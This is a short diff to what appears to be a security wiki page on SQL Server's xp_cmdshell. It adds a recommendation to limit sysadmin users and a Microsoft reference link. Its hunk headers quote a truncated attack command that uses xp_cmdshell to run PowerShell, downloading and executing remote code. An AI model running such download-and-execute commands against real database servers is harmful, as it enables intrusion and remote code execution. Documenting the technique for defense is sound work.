@@ -43,7 +43,7 @@ EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadStri
 
 ### Recommendations
 
-*
+* Sysadmin users can enable xp\_cmdshell, so limit these users.
 
 ### Detection
 
@@ -51,3 +51,4 @@ EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadStri
 
 ## References
 
+{% embed url="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" %}
